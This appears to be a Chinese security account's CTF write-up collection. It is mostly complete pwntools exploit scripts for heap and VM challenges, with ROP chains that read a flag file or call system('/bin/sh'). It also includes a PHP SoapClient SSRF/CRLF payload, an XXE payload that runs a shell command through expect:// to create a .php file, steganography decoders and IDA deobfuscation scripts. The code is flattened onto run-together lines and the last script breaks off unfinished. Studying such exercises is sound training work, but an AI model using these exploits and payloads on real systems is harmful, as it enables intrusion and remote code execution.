int main(){ Add(0xf0); Add(0xf0); Add(0xf0); Del(2); Del(1); Alloc(); Edit(0,0x100/4,0x10000); Add(0xf0); Add(0xf0); Edit(2,0,1220555080); Edit(2,1,1213658673); Edit(2,2,1768042431); Edit(2,3,1932472174); Edit(2,4,1599362920); Edit(2,5,261700528); Edit(2,6,5); Edit(2,(0x78B108-0x10000)/4,0x10000); Edit(2,((0x78B108-0x10000)/4)+1,0); EditAlloc(); return 0;}

6

safebuf

#coding:utf-8import sysimport osfrom pwn import *from ctypes import CDLLfrom a_pb2 import *context.log_level='debug'elfelf='./pwn'libc_base=0heap_base=0#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' b *$rebase(0x71E2) b *$rebase(0x7234) b *$rebase(0x7CA6) b *$rebase(0x50A7) '''
 if len(sys.argv)==1 : # io=process(['./'],env={'LD_PRELOAD':'./'}) io=process(elfelf) # clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') # clibc.srand(clibc.time(0)) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld.so.6') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : io=remote('172.20.2.1',9008) # clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') # clibc.srand(clibc.time(0)) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld.so.6') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(1)
 def choice(id,b,c): a=GoogleMessage() a.arg1=id a.arg2.content=b'a'*0x40 a.arg3.content=b a.arg3.idx=c pay=a.SerializeToString() return pay
 def choice1(id,b,c): a=GoogleMessage() a.arg1=id a.arg3.content=b'./flag' a.arg3.size=c # a.arg3.idx=c a.arg4.idx=b&0xffffffff a.arg4.content=b'c' a.arg4.size=b>>32 a.arg4.seek=0x80 pay=a.SerializeToString() return pay

 pay=choice(5,b'a'*0x40,0xaa) 0x2de8 io.sendlineafter(b'$ ',pay) io.sendline(b'32') io.recvuntil(b'a'*0x40) io.recv(6) heap_base=u64(io.recv(8)) io.recv(0x90)
 libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_'] libc_base=libc_base&0xfffffffffffff000 libc.address=libc_base bin_sh_addr=next(libc.search(b'/bin/shx00')) system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=next(libc.search(asm('pop rax;ret'))) pop_rdi_ret=next(libc.search(asm('pop rdi;ret'))) pop_rsi_ret=next(libc.search(asm('pop rsi;ret'))) pop_rdx_ret=next(libc.search(asm('pop rdx;pop rbx;ret'))) syscall_ret=next(libc.search(asm('syscall;ret')))
 pay=choice1(5,libc_base-0x109000+0x2de8,heap_base-0xa308) io.sendlineafter(b'$ ',pay) io.sendline(b'32') io.recvuntil('n5') canary=io.recv(8) flag_name_addr=heap_base-0x8ac0 pay=choice1(4,libc_base-0x109000+0x2de8,heap_base-0xa308)
 io.sendlineafter(b'$ ',pay) pay1=b'a'*0x1c+canary+p64(0) pay1+=p64(pop_rdi_ret)+p64(flag_name_addr) pay1+=p64(pop_rsi_ret)+p64(0) pay1+=p64(pop_rdx_ret)+p64(0x30)*2 pay1+=p64(pop_rax_ret)+p64(2) pay1+=p64(syscall_ret)

 pay1+=p64(pop_rax_ret)+p64(0) pay1+=p64(pop_rdi_ret)+p64(3) pay1+=p64(pop_rsi_ret)+p64(heap_base) pay1+=p64(syscall_ret)
 pay1+=p64(pop_rax_ret)+p64(1) pay1+=p64(pop_rdi_ret)+p64(1) pay1+=p64(pop_rsi_ret)+p64(heap_base) pay1+=p64(syscall_ret)
 gdb_attach(io,gdb_text) io.sendline(pay1)

 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))

 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
<?php$target = 'http://127.0.0.1/index.php?s=login';$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^Cookie: PHPSESSID=edisec^^Content-Length: 32^^^^username=admin&password=password','uri'=> "a"));$a = serialize($b);$a = str_replace('^^',"rn",$a);$a = str_replace('&', '%26', $a);echo bin2hex(urldecode($a));?>
```



```
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "expect://mv$IFSxx.png$IFSxx.php" >]><root><name>&xxe;</name></root>
```



```
import reimport binascii
n = 598795result = ''fina = ''f=open('list.txt','r').read()steps=f.split("n")
step_list=[]for i in steps: step_list.append(int(i,16))
file = open('1.mp3','rb')num=0while num < len(step_list) : file.seek(n,0) n += step_list[num] file_read_result = file.read(1) read_content = bin(ord(file_read_result))[-1] result = result + read_content num+=1print(result)
```



```
import re
fina = ''result = '01010100010010000110010100101101010100000110111101110111011001010101001000101101011101000110111100101101010000100101001001100101011000010110101100101101011101000100100001100101001011010100011001100001011101000110010100101101001100010101001100101101010100110111010101010010011001010110110001011001001011010110110000110001011010110110010100101101011101000100100000110011001011010100001001001100010000010100010000110011001000000011011101101111001011010110001001100101001000000110110100110000011101100011001101000100001000000100010001001111010101110110111000000000'textArr = re.findall('.{'+str(8)+'}', result)# textArr.append(result[(len(textArr)*8):])for i in textArr: fina = fina + chr(int(i,2)).strip('n')print(fina)
```



```
_DWORD *__fastcall sub_1530(__int64 a1, int a2, int a3){ _DWORD *v4; // rbp int v5; // r12d int v6; // eax bool v8; // [rsp+Eh] [rbp-3Ah] bool v9; // [rsp+Fh] [rbp-39h]
 v4 = calloc(1uLL, 0x20F0uLL); v8 = (((_BYTE)dword_628C * ((_BYTE)dword_628C - 1)) & 1) == 0; v5 = 2112114787; if ( (((_BYTE)dword_628C * ((_BYTE)dword_628C - 1)) & 1) == 0 ) v5 = 534868956; v9 = dword_6294 < 10; if ( dword_6294 < 10 ) v5 = 534868956; v6 = 1909852961; do {LABEL_9: if ( v6 != 1909852961 ) { if ( v6 == 2112114787 ) { *(_QWORD *)v4 = a1; v4[2] = a2; *((_QWORD *)v4 + 2) = calloc(a3, 4uLL); v4[6] = a3; v6 = -483786444; break; } goto LABEL_20; } v6 = 2112114787; if ( v9 ) v6 = -483786444; if ( v8 ) v6 = -483786444; } while ( v6 > 1909852960 ); while ( v6 == -483786444 ) { *(_QWORD *)v4 = a1; v4[2] = a2; *((_QWORD *)v4 + 2) = calloc(a3, 4uLL); v4[6] = a3; v6 = v5; if ( v5 > 1909852960 ) goto LABEL_9; } if ( v6 != 534868956 ) { while ( 1 )LABEL_20: ; } return v4;}
```



```
//a1=main函数的栈地址(也是我们输入vmcode的地址) a2=40000 a3=0sub_1530:
_DWORD *v4;v4 = calloc(1uLL, 0x20F0uLL);*(_QWORD *)v4 = a1;v4[2] = a2;*((_QWORD *)v4 + 2) = calloc(a3, 4uLL);v4[6] = a3;*(_QWORD *)v4 = a1;v4[2] = a2;*((_QWORD *)v4 + 2) = calloc(a3, 4uLL);v4[6] = a3;return v4;
```



```
struct vm{ int *code_addr; int size; int *regs; int r_num; int stack[0x830];};
```



```
v4->code_addr = (int *)a1;v4->size = a2;v4->regs = (int *)calloc(a3, 4uLL);v4->r_num = a3;
```



```
def push(a): return p32(9)+p32(a) def push_r(a): return p32(0xb)+p32(a)    def pop_r(a):               return p32(0xd)+p32(a)              def again():               return p32(0x12)              def show(a):               return p32(0xe)*a
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./chall'#context.arch='amd64'libc_base=0heap_base=0idx=0x10while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' b *$rebase(0x1410) '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9092) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(0.5)
 def push(a): return p32(9)+p32(a)
 def push_r(a): return p32(0xb)+p32(a)
 def pop_r(a): return p32(0xd)+p32(a)
 def again(): return p32(0x12)
 def show(a): return p32(0xe)*a
 gdb_attach(io,gdb_text) io.sendafter('input: ',show(7)+again()) io.recvuntil('0n') heap_addr1=int(io.recv(5)[:-1],16) heap_addr2=int(io.recv(8),16)+0x20 io.recvuntil('9c40n') stack_addr1=int(io.recv(5)[:-1],16) stack_addr2=int(io.recv(8),16)+0x9C58
 pay=show(3)+push(stack_addr2)+push(stack_addr1) pay+=push_r(0)+push_r(1)+show(4)+push(heap_addr2)+push(heap_addr1) io.sendafter('input: ',pay+again()) io.recvuntil('n') io.recvuntil('n') io.recvuntil('n') libc1=int(io.recv(5)[:-1],16) libc_base=int(io.recv(8),16)-0x23f90-243
 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook']

 pay=show(3)+push(free_hook_addr-8)+push(libc1) pay+=push(u32('/bin'))+pop_r(0) pay+=push(u32('/shx00'))+pop_r(1) pay+=push(system_addr)+pop_r(2) pay+=push(libc1)+pop_r(3) io.sendafter('input: ',pay+again())

 # success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) # success('stack_addr:'+hex((stack_addr1<<32)+stack_addr2))
 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```



```
// local variable allocation has failed, the output may be wrong!int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ __int64 v3; // rcx __int64 v4; // rdx __int64 v5; // rcx unsigned __int64 v6; // rdi __int64 v7; // rsi __int64 v8; // rax int v9; // eax __int64 v10; // rcx __int64 v11; // rsi __int64 v12; // rdi __int64 v13; // rsi __int64 v14; // rcx __int64 v15; // rsi __int64 v16; // rdi int v17; // esi __int64 v18; // rax int v19; // eax _DWORD v20[6]; // [rsp+0h] [rbp-130h] BYREF __int64 *v21; // [rsp+18h] [rbp-118h] int i; // [rsp+E0h] [rbp-50h] char v23; // [rsp+E6h] [rbp-4Ah] bool v24; // [rsp+E7h] [rbp-49h] _DWORD *v25; // [rsp+E8h] [rbp-48h] __int64 *v26; // [rsp+F0h] [rbp-40h] __int64 v27; // [rsp+F8h] [rbp-38h]
 v4 = (unsigned int)(dword_6C2688 - 1); v23 = ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0; v24 = dword_6C2690 < 10; v3 = 112080690LL; LOBYTE(argv) = 0; LOBYTE(argc) = 0; LOBYTE(v4) = 1; if ( !((dword_6C2690 < 10 && (v23 & 1) != 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~v23) & 1) ) goto LABEL_34; while ( 1 ) { v25 = &v20[-4]; v26 = (__int64 *)&v20[-4]; v20[-4] = 0; init(*(_QWORD *)&argc, argv, v4, v3); v3 = 2845733290LL; v4 = 3632247323LL; LOBYTE(argv) = 1; *(_QWORD *)&argc = (((_BYTE)dword_6C2688 - 7 + 6) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10 && argc == 0) | (dword_6C2690 < 10) ^ (argc == 0) ) break;LABEL_34: v20[-4] = 0; init(*(_QWORD *)&argc, argv, v4, v3); i = 112080690; } for ( i = 99838845; ; i = 99838845 ) { v5 = 3325517854LL; LOBYTE(v4) = 1; v6 = (unsigned int)dword_6C2690; v7 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( !((dword_6C2690 < 10 && (_DWORD)v7 == 0) | (dword_6C2690 < 10) ^ ((_DWORD)v7 == 0)) ) goto LABEL_35; while ( 1 ) { v8 = read_long(v6, v7, v4, v5); v5 = 3801052166LL; v4 = 817338735LL; v6 = (unsigned __int64)v26; *v26 = v8; v27 = *v26; LOBYTE(v7) = 1; if ( (dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1 ) break;LABEL_35: v18 = read_long(v6, v7, v4, v5); v5 = (__int64)v26; *v26 = v18; i = -969449442; v21 = v26; } i = 1818302425; if ( v27 < 4 ) { if ( v27 >= 2 ) { v4 = v27; if ( v27 >= 3 ) { show(v6, v7, v27, 2777366289LL); i = 115005891; goto LABEL_31; } v10 = 23550316LL; v11 = 0xFFFFFFFFLL; v12 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; LOBYTE(v4) = 1; if ( (dword_6C2690 < 10 && (_DWORD)v12 == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~((_DWORD)v12 == 0)) & 1 ) goto LABEL_20; while ( 1 ) { edit(v12, v11, v4, v10); i = 23550316;LABEL_20: edit(v12, v11, v4, v10); v10 = 3300370907LL; v12 = (unsigned int)dword_6C2690; v4 = 0xFFFFFFFFLL; v11 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v11 == 0) | (dword_6C2690 < 10 && (_DWORD)v11 == 0) ) { i = 115005891; goto LABEL_31; } } } if ( v27 == 1 ) { add(v6, v7, 1LL, 3625747768LL); i = 115005891; goto LABEL_31; } goto LABEL_28; } if ( v27 >= 6 ) { if ( v27 < 7 ) { v14 = 2980125399LL; v15 = (unsigned int)dword_6C2690; v16 = (unsigned int)(dword_6C2688 - 1); v4 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v4 == 0) | (dword_6C2690 < 10 && (_DWORD)v4 == 0) ) {LABEL_26: sub_401650(v16, v15, v4, v14); v14 = 3602426981LL; v16 = (unsigned int)dword_6C2690; v15 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; LOBYTE(v4) = 1; if ( (dword_6C2690 < 10 && (_DWORD)v15 == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~((_DWORD)v15 == 0)) & 1 ) { i = 115005891; goto LABEL_31; } } sub_401650(v16, v15, v4, v14); i = -1314841897; goto LABEL_26; } v9 = -1976565134; if ( v27 == 7 ) v9 = 1617921039; i = v9;LABEL_28: i = -1369147532; v17 = (((_BYTE)dword_6C2688 - 120 + 119) * (_BYTE)dword_6C2688) & 1; if ( !((dword_6C2690 < 10 && v17 == 0) | (dword_6C2690 < 10) ^ (v17 == 0)) ) goto LABEL_39; while ( 1 ) { sub_40B960("Unknown"); v4 = 2208571241LL; if ( (dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1 ) { i = 115005891; goto LABEL_31; }LABEL_39: v19 = sub_40B960("Unknown"); i = 2025167804; v20[5] = v19; } } if ( v27 >= 5 ) { v13 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v13 == 0) | (dword_6C2690 < 10 && (_DWORD)v13 == 0) ) backdoor(0LL, v13, 0xFFFFFFFFLL, 3012737502LL); backdoor(0LL, v13, 0xFFFFFFFFLL, 3012737502LL); } delete(v6, v7, v27, 839414269LL); i = 115005891;LABEL_31: if ( !((dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1) ) goto LABEL_40; while ( !((dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | (dword_6C2690 < 10) ^ (((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) )LABEL_40: i = 1652216043; }}
```



```
__int64 __fastcall sub_401650(__int64 a1, __int64 a2){ v31 = ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0; v32 = dword_6C268C < 10; if ( !(((dword_6C268C < 10) ^ v31) & 1 | (dword_6C268C < 10 && v31)) ) goto LABEL_17; while ( 1 ) { v33 = v23; v2 = &v23[-16]; v34 = &v23[-16]; v35 = dword_6C1330 != 0; v3 = dword_6C268C; v4 = dword_6C2680 - 1233492817 + 1233492816; v5 = (((_BYTE)dword_6C2680 - 81 + 80) * (_BYTE)dword_6C2680) & 1; LOBYTE(a2) = (dword_6C268C < 10) ^ (v5 == 0); if ( (unsigned __int8)a2 | (dword_6C268C < 10 && v5 == 0) ) break;LABEL_17: v30 = -74059996; } LOBYTE(v2) = v35; if ( v35 ) { result = sub_40B960("You have use the backdoor once"); v30 = 646810775; v29 = result; } else { dword_6C1330 = 1; *(_QWORD *)v33 = 0LL; v28 = printf((unsigned int)"Input: ", a2, (_DWORD)v2, 1528823701, v3, v4, v23[0]); v9 = read_long("Input: ", a2, v7, v8); *(_QWORD *)v33 = v9; if ( *(_QWORD *)v33 >= 0x10uLL ) goto LABEL_9; if ( !((dword_6C268C < 10) ^ (((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) | (dword_6C268C < 10 && ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0)) ) goto LABEL_18; while ( 1 ) { v10 = *(_QWORD *)v33; v36 = (&buf)[*(_QWORD *)v33] == 0LL; v11 = dword_6C2680 - 633399322 + 633399321; v12 = (((_BYTE)dword_6C2680 - 26 + 25) * (_BYTE)dword_6C2680) & 1; if ( (dword_6C268C < 10) ^ (v12 == 0) | (dword_6C268C < 10 && v12 == 0) ) break;LABEL_18: v30 = 906460608; v26 = v33; } if ( v36 ) {LABEL_9: v13 = (((_BYTE)dword_6C2680 - 103 + 102) * (_BYTE)dword_6C2680) & 1; if ( !((dword_6C268C < 10) ^ (v13 == 0) | (dword_6C268C < 10 && v13 == 0)) ) goto LABEL_19; while ( 1 ) { result = 860644631LL; if ( (dword_6C268C < 10) ^ (((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) | (dword_6C268C < 10 && ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) ) break;LABEL_19: v30 = -206821341; } v30 = 646810775; } else { v14 = -2078560568; v15 = dword_6C2680 - 1692356262 + 1692356261; v16 = (((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1; LOBYTE(v11) = 0; LOBYTE(v10) = 1; if ( !((dword_6C268C < 10 && (_DWORD)v16 == 0) | ((unsigned __int8)~(dword_6C268C < 10) ^ (unsigned __int8)~((_DWORD)v16 == 0)) & 1) ) goto LABEL_20; while ( 1 ) { v27 = printf((unsigned int)"Input: ", v16, v10, v14, v15, v11, v23[0]); v19 = read_long("Input: ", v16, v17, v18); v14 = 307732780; LODWORD(v10) = 847373277; *(_QWORD *)v34 = v19; v37 = *(_QWORD *)v34 < count[*(_QWORD *)v33]; v16 = 0xFFFFFFFFLL; v11 = (((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1; LOBYTE(v15) = (dword_6C268C < 10) ^ (v11 == 0); if ( (unsigned __int8)v15 | (dword_6C268C < 10 && v11 == 0) ) break;LABEL_20: v25 = printf((unsigned int)"Input: ", v16, v10, v14, v15, v11, v23[0]); v22 = read_long("Input: ", v16, v20, v21); *(_QWORD *)v34 = v22; v30 = -2078560568; v24 = v34; } result = 646810775LL; if ( v37 ) { result = *(_QWORD *)v34; count[*(_QWORD *)v33] = *(_QWORD *)v34; v30 = 646810775; } } } return result;}
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./sitnote'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9095) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): sleep(0.1) io.sendline(str(a))
 def add(a,b): choice(1) io.sendlineafter('Input: ',str(a)) io.sendlineafter('Input: ',str(b))
 def edit(a,b): choice(2) io.sendlineafter('Input: ',str(a)) io.sendafter('Output: ',b)
 def show(a): choice(3) io.sendlineafter('Input: ',str(a))
 def delete(a): choice(4) io.sendlineafter('Input: ',str(a))
 for i in range(0xa): add(i,0x78)
 for i in range(9): delete(i)
 for i in range(0x9): add(i,0x78)
 add(10,0x78) delete(9) delete(10) edit(8,p64(0x6c1ec8)) add(9,0x78) add(10,0x78) edit(9,'/bin/shx00') edit(10,p64(0x40ab70))
 delete(9)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```



```
start=0x11f7end=0x5e30
for addr in idautils.Heads(start, end): if 'call sub_1158' == idc.GetDisasm(addr): addr1=addr addr3=addr+5 while True: addr2=addr1 addr1=idc.prev_head(addr1) if 'mov r12, [rbp+' in idc.GetDisasm(addr1): addr2=addr1 addr1=idc.prev_head(addr1) addr2=addr1 addr1=idc.prev_head(addr1) break if 'mov rax,'in idc.GetDisasm(addr1): call_addr=0 call_addr+=idc.get_wide_byte(addr1+3) call_addr+=(idc.get_wide_byte(addr1+4)<<8) call_addr+=(idc.get_wide_byte(addr1+5)<<16) call_addr+=(idc.get_wide_byte(addr1+6)<<24) call_addr+=addr2 call_addr=idc.get_wide_word(call_addr) print(hex(call_addr)) print(idc.GetDisasm(addr1))
 if 'lea rax,'in idc.GetDisasm(addr1): call_addr=0 call_addr+=idc.get_wide_byte(addr1+3) call_addr+=(idc.get_wide_byte(addr1+4)<<8) call_addr+=(idc.get_wide_byte(addr1+5)<<16) call_addr+=(idc.get_wide_byte(addr1+6)<<24) call_addr+=addr2 # call_addr&=0xffffffff print(hex(call_addr)) print(idc.GetDisasm(addr1))
 value=call_addr-addr3 for i in range(4): v1=(value>>(i*0x8))&0xff idc.patch_byte(addr+1+i,v1)
```



```
for i in range(0xf): add(i,'keer','aaaa')
for i in range(0x9): link(i,9,i+1,0)
我们创建了0xf个线程，然后，构成了这么一个回路线程0里面存的除了与主线程发送和接收主线程的管道还存储了id为9 但是发送和接收都是与线程1交互的结构体流线程1里面存的除了与主线程发送和接收主线程的管道还存储了id为9 但是发送和接收都是与线程2交互的结构体流···以此类推如果我们通过主线程的选项10向线程0发送一个id为9，选项为2的包，我们先看下，下列过程（线程中）
```



```
经过上图，发送个线程0，id为9，选项为2的数据包会：主线程->线程0->线程1->线程2->线程3->线程4->线程5->线程6->线程7->线程8->线程9然后进入线程中选项二copy栈中数据重新倒着走一遍线程9->线程8->线程7->线程6->线程5->线程4->线程3->线程2->线程1->线程0->主线程这样就可以绕过v15<=7这个限制了之后就是栈上数据泄露和栈上数据覆盖的操作了。
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./messageSystem'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' b *$rebase(0x2D11) b *$rebase(0x2AF4) '''
 # gdb_text=''' # b *$rebase(0x4A42) # b *$rebase(0x2AA2) # b *$rebase(0x2C0C) # b *$rebase(0x2809) # b *$rebase(0x33A5) # b *$rebase(0x2559) # b *$rebase(0x352B) # '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9096) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.31.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('>> ',str(a))
 def add(a,b,c): choice(1) io.sendlineafter('addressID: ',str(a)) io.sendlineafter('nodeName: ',b) io.sendlineafter('nodeMessage: ',c)
 def link(a,b,c,d): choice(3) io.sendlineafter('addressID1: ',str(a)) io.sendlineafter('addressID1: ',str(b)) io.sendlineafter('addressID2: ',str(c)) io.sendlineafter('addressID2: ',str(d))
 def gift(idx,pay): choice(10) io.sendlineafter('addressID: ',str(idx)) io.sendlineafter('size: ',str(len(pay))) io.sendafter('data: ',pay)
 def show_idx(id,index): pay=p32(2)+p32(index) gift(id,pay)
 def edit_idx(id,index,data): pay=p32(1)+p32(index)+p32(0x20)+data gift(id,pay)
 for i in range(0xf): add(i,'keer','aaaa')
 for i in range(0x9): link(i,9,i+1,0)
 show_idx(9,0xffffffff) io.recvuntil('ret: ') io.recv(0x18) leak=u64(io.recvuntil('x7f')[-6:]+'x00x00') off_addr=0x225b0+0x22000 # off_addr=0x225b0+0x22000 libc_base=(leak-off_addr-0x30) libc.address=libc_base
 bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=libc.search(asm('pop rax;ret')).next() pop_rdi_ret=libc.search(asm('pop rdi;ret')).next() pop_rsi_ret=libc.search(asm('pop rsi;ret')).next() pop_rdx_ret=libc.search(asm('pop rdx;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 index=0x100000000-(0x320//0x20) pay=p64(0)+p64(libc.sym['memcpy'])+p64(pop_rdi_ret) pay+=p64(bin_sh_addr)+p64(system_addr) edit_idx(9,index,pay)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```



```
def login(): choice(1) io.recvuntil('challenge: ') data=io.recvuntil('n') key=[] c='' sum1=0 for i in range(15): aaa=int(data[i*2:i*2+2],16) c+=(hex(aaa^i^0x11)[2:]).ljust(2,'0') sum1+=aaa^i^0x11
 c+=(hex(0x100-(sum1%0x100))[2:]).rjust(2,'0') print c io.sendlineafter('response: ',c)
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./note'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.20.2.1',9007) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.31.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(0.5)
 def choice(a): io.sendlineafter('>> ',str(a))
 def add(a,b,c): choice(2) io.sendlineafter('safe -> 1): ',str(c)) io.sendlineafter('size: ',str(a)) io.sendafter('content: ',b)
 def show(a): choice(3) io.sendlineafter('index: ',str(a))
 def delete(a): choice(4) io.sendlineafter('index: ',str(a))
 def login(): choice(1) io.recvuntil('challenge: ') data=io.recvuntil('n') key=[] c='' sum1=0 for i in range(15): aaa=int(data[i*2:i*2+2],16) c+=(hex(aaa^i^0x11)[2:]).ljust(2,'0') sum1+=aaa^i^0x11
 c+=(hex(0x100-(sum1%0x100))[2:]).rjust(2,'0') print c io.sendlineafter('response: ',c)
